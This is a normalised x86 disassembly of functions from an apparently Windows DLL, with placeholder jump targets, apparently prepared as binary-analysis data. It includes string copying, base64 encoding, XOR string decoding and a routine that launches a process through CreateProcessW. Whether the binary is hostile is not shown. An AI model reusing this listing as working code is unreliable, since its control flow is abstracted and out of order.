pop ebp
retn
pop edi
pop esi
mov eax 0xf
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10031a50
push ebp
mov ebp esp
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi ] r--data
mov [ esi + 0x14 ] eax
cmp ebx edi
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
mov ebx [ lstrlenW@IAT ]
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_10078600
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
mov ebx [ lstrlenW@IAT ]
call ebx
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
mov [ esi + 0x4 ] eax
call sub_10078600
add esp 0xc
xor edi edi
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
pop edi
mov eax esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
cmp eax edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0xc ]
push edi
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_10078600
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
cmp [ ebp + 0xc ] edi
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
push edi
push ecx
push eax
mov [ esi + 0x10 ] eax
call sub_10078600
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] edi
sub_10031b70
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
cmp eax 0x1ffffffe
jb r-xdata
inc eax
push ebx
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edi + 0x4 ] eax
mov edx [ ecx + 0x4 ]
xor bl bl
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
call sub_10065045
add esp 0x4
push r--data
call sub_100616c6
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ edx + 0x4 ] edi
mov edx [ ecx + 0x4 ]
mov [ edx ] edi
mov eax [ ecx + 0x4 ]
mov [ eax + 0x8 ] edi
jmp r-xdata
mov [ eax + 0x8 ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ eax ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax edi
cmp [ edx + 0x14 ] bl
jne r-xdata
mov [ edx + 0x8 ] edi
mov [ edx ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
mov [ ecx + 0x14 ] 0x1
pop ebx
pop ebp
retn 0x10
push esi
lea ebx [ ebx ]
mov esi [ esi ]
cmp [ esi + 0x14 ] bl
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] bl
jne r-xdata
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax ]
mov esi [ edx + 0x8 ]
mov [ eax ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax + 0x8 ]
mov esi [ edx ]
mov [ eax + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edx [ eax + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_10031da0
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push edi
cmp [ esi ] ebx
jne r-xdata
lea ecx [ ebp - 0x7c ]
push ecx
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x7c ] ebx
call sub_10039230
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0x7c ]
lea ecx [ ebp - 0x78 ]
call sub_1004e890
test eax eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0xb7
call sub_1001bb80
mov eax 0x2
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov ecx [ ebp - 0x7c ]
mov edx [ ebp - 0x78 ]
push eax
call sub_1003ca90
test eax eax
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x84
call sub_1001bb80
mov eax 0x3
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x78 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x14e
call sub_1001bb80
lea edx [ ebp - 0x24 ]
mov eax 0xa4
call sub_1001bb80
lea edx [ ebp - 0x20 ]
mov eax 0x144
call sub_1001bb80
lea edx [ ebp - 0x1c ]
mov eax 0x12b
call sub_1001bb80
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x80 ]
push ecx
lea edx [ ebp - 0x8c ]
push edx
lea eax [ ebp - 0x88 ]
push eax
mov eax [ esi ]
mov [ ebp - 0x88 ] ebx
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x80 ] ebx
call sub_100035a0
lea edx [ ebp - 0x74 ]
mov eax 0xc6
call sub_1001bb80
mov eax 0x4
pop edi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10031f20
push ebp
mov ebp esp
push 0xffffffff
push sub_10080212
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100480a0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_100480a0
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] dx
push eax
jmp r-xdata
call sub_10051390
sub_10032003
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100029f0
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_10032080
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_1002050e
int3
sub_100320c0
push ebp
mov ebp esp
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x3c ]
add ecx [ esi + 0x80 ]
push ebx
lea eax [ ecx + ecx + 0x4 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ esi + 0x84 ] 0x8
mov ebx eax
jb r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ esi + 0x70 ]
mov ecx [ esi + 0x70 ]
jmp r-xdata
pop ebx
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp eax 0x7fffffff
ja r-xdata
mov edx [ esi + 0x3c ]
mov eax [ esi + 0x80 ]
lea eax [ edx + eax + 0x2 ]
test eax eax
je r-xdata
push ecx
mov edx 0x7ffffffe
mov ecx ebx
call sub_1006b860
test eax eax
jns r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x80 ]
lea edx [ ecx + edx + 0x2 ]
push edi
lea edi [ ebp - 0x5c ]
mov ecx ebx
mov [ ebp - 0x58 ] edx
call sub_1006b800
test eax eax
js r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x5c ]
mov eax [ ebp - 0x58 ]
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
test eax eax
jns r-xdata
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x80 ]
lea edx [ ecx + edx + 0x2 ]
lea edi [ ebp - 0x64 ]
mov ecx ebx
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edx
call sub_1006b800
test eax eax
js r-xdata
mov eax [ eax ]
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x5c ]
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
test eax eax
jns r-xdata
push 0x44
lea ecx [ ebp - 0xb8 ]
push 0x0
push ecx
call sub_10078970
add esp 0xc
xor eax eax
lea edx [ ebp - 0x74 ]
push edx
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0xb8 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push 0x0
mov [ ebp - 0xb8 ] 0x44
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x28 ]
mov eax 0xb5
call sub_1001bb80
lea edx [ ebp - 0x40 ]
mov eax 0x149
call sub_1001bb80
mov eax [ ebp - 0x74 ]
push 0xffffffff
push eax
mov [ esi + 0x4c ] eax
call [ WaitForSingleObject@IAT ]
mov edx [ esi + 0x4c ]
lea ecx [ ebp - 0x60 ]
push ecx
push edx
call [ GetExitCodeProcess@IAT ]
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x4 ]
pop edi
mov [ esi + 0x50 ] eax
pop ebx
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x54 ]
mov eax 0x54
call sub_1001bb80
pop edi
pop ebx
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100322f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1003234f
push 0x14
push r--data
call sub_10078b50
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_10078b95
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_10078cc8
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100323e5
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_100323e5
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_1001f63f
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_10032420
push ebp
mov ebp esp
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0x18 ]
mov [ edi ] 0x0
mov [ edx ] ecx
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
pop ebp
retn
push ebx
mov eax [ esi ]
movzx ecx [ eax ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] ecx
mov ebx [ ebp + 0x10 ]
inc eax
mov [ esi ] eax
movzx ecx [ eax ]
mov [ ebx ] ecx
mov ebx [ ebp + 0x14 ]
inc eax
mov [ esi ] eax
movzx ecx [ eax ]
mov [ ebx ] ecx
inc eax
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov eax [ edx ]
mov edx ecx
sar edx 0x2
and edx 0x3f
movzx edx [ edx + r--data ]
mov [ eax ] dl
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
mov ebx edx
shl ecx 0x4
sar ebx 0x4
add ebx ecx
and ebx 0x3f
movzx ecx [ ebx + r--data ]
mov [ eax + 0x1 ] cl
mov ecx [ ebp + 0x14 ]
mov ecx [ ecx ]
add [ edi ] 0x3
mov ebx ecx
sar ebx 0x6
lea edx [ ebx + edx * 4 ]
and edx 0x3f
movzx edx [ edx + r--data ]
mov [ eax + 0x2 ] dl
mov edx [ ebp + 0x18 ]
and ecx 0x3f
movzx ecx [ ecx + r--data ]
mov [ eax + 0x3 ] cl
add eax 0x4
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ edi ] eax
jb r-xdata
pop ebx
sub_100324d8
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_1005b4d5
push [ esi + 0x10 ]
call sub_1005b4d5
push [ esi + 0x14 ]
call sub_1005b4d5
push [ esi + 0x18 ]
call sub_1005b4d5
add esp 0x10
pop esi
retn
sub_10032502
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_10054678
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0xc
push [ esi + 0x30 ]
call sub_10078ac0
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_10078ac0
mov esi [ ebp - 0x8 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x4 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x8 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10028397
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
add edi 0x68
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
int3
push esi
call sub_10078ac0
add esi eax
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_10078ac0
add esi eax
inc [ ebp - 0x4 ]
add edi 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
jb r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_10032600
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fcd0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub ecx 0x1c
cmp eax ecx
je r-xdata
mov ebx [ eax + 0xc ]
mov edx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ecx ]
mov [ eax ] ebx
mov ebx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ecx + 0xc ]
mov [ eax + 0xc ] ebx
mov [ ecx ] edx
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] edi
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov esi [ ecx + 0x10 ]
mov [ eax + 0x10 ] esi
mov [ ecx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov esi [ ecx + 0x14 ]
mov [ eax + 0x14 ] esi
add eax 0x1c
mov [ ecx + 0x14 ] edx
cmp eax ecx
jne r-xdata
sub_100326b0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea esp [ esp ]
mov edx [ esi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop ebx
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x10 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
mov [ edi + 0x10 ] 0x0
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x50 ] 0x0
je r-xdata
push eax
call ebx
cmp [ edi + 0x54 ] 0x0
lea esi [ edi + 0x54 ]
je r-xdata
mov [ edi + 0x50 ] 0x0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ ebp + 0x8 ]
call sub_10017e40
sub_10032770
push ebp
mov ebp esp
push 0xffffffff
push sub_1008271b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xc0 ] ecx
call sub_1001ce90
xor ecx ecx
cmp eax ecx
je r-xdata
xor edx edx
mov [ ebp - 0xa8 ] 0x7
mov [ ebp - 0xac ] ecx
mov [ ebp - 0xbc ] dx
mov [ ebp - 0x4 ] ecx
lea ebx [ ebp - 0xbc ]
mov ecx esi
call sub_10060940
test eax eax
je r-xdata
lea edx [ ebp - 0xa0 ]
lea eax [ ecx + 0x5a ]
call sub_1001bb80
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc4 ]
push ecx
mov ecx [ ebp - 0xc0 ]
mov ebx edi
lea edx [ ebp - 0xbc ]
call sub_1001cc80
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x30
call sub_1001bb80
cmp [ ebp - 0xa8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0xa8 ] 0x8
jb r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0xf6
call sub_1001bb80
cmp [ ebp - 0xa8 ] 0x8
jb r-xdata
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov eax [ ebp - 0xbc ]
push eax
call sub_10065045
add esp 0x4
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0xbc ]
push edx
call sub_10065045
add esp 0x4
sub_100328b0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10032900
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f768
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor edi edi
push 0x4
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
push edi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x1c ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
